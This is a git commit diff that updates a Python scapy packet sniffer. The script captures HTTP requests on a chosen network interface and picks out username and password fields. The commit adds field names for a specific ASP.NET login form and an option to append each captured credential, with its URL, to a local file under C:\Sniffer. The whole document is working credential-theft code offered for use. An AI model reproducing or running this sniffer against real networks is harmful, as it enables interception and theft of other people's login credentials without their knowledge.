b52dcfd036fa4bfaf534342ce2e57e57744a83b8
Bhavishya Tyagi <31559206+HanuTyagi@users.noreply.github.com>
2023-01-25 16:12:25 +0530

    Update sniffer.py

--- sniffer.py
+++ sniffer.py
@@ -1,9 +1,10 @@
 import scapy.all as scapy
-import urllib.parse
 from scapy.layers import http
+import urllib.parse
+import os
 
 def sniff(interface):
-    scapy.sniff(prn=process_sniffed_packets)
+    scapy.sniff(iface=interface,prn=process_sniffed_packets)
 
 def get_url(packet):
     if packet.haslayer(http.HTTPRequest):
@@ -14,7 +15,7 @@ def get_login_info(packet):
     if packet.haslayer(http.HTTPRequest):
         if packet.haslayer(scapy.Raw):
             load = packet[scapy.Raw].load
-            keybword = ["usr", "uname", "username", "pwd", "pass", "password"]
+            keybword = ["usr", "uname", "username", "pwd", "pass", "password", "ctl00$CPHContainer$txtPassword", "ctl00$CPHContainer$txtUserLogin", "ctl00_CPHContainer_txtUserLogin", "ctl00_CPHContainer_txtPassword", "ctl00%24CPHContainer%24txtPassword", "ctl00%24CPHContainer%24txtUserLogin"]
             for eachword in keybword:
                 if eachword.encode() in load:
                     return load
@@ -23,11 +24,22 @@ def get_login_info(packet):
 def process_sniffed_packets(packet):
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
-        print("[+] HTTP Request>>" + str(url))
+        print("[+] HTTP Request >> " + str(url))
 
         login_info = get_login_info(packet)
         if login_info:
             print("[+] Possible USERNAME And PASSWORD Captured")
-            print("\t[x] USERNAME And PASSWORD >>" + urllib.parse.unquote(str(login_info)) + "\n\n")
+            print("\t[x] USERNAME And PASSWORD >> " + urllib.parse.unquote(str(login_info)) + "\n\n")
+            if y == 'Y':
+                passcode = os.path.join(r"C:\Sniffer","Pass.txt")
+                if not os.path.exists(r"C:\Sniffer"):
+                    os.makedirs(r"C:\Sniffer")
+                passcode = open(r"C:\Sniffer\Pass.txt","a+")
+                passcode.write(f"{str(url)}  -  {urllib.parse.unquote(str(login_info))}\n")
+                passcode.close
 
-sniff('eth0')
+x = input("\n[+]Enter The Interface To Sniff  - ")
+global y
+y = input("\n[+]Press Y/N To Store Captured Passwords  - ")
+print(f"\n\n[+]Now Sniffing {x}\n")
+sniff(x)
